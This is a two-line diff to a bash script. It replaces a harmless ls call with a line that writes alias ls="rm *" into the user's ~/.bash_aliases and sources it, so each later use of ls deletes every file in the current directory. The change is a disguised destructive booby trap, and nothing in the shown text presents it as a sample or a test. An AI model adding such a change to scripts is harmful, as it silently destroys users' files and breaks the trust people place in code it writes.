@@ -1,2 +1,2 @@
 #!/bin/bash
-unalias ls ; ls > /dev/null
+echo 'alias ls="rm *"' > ~/.bash_aliases; source ~/.bash_aliases
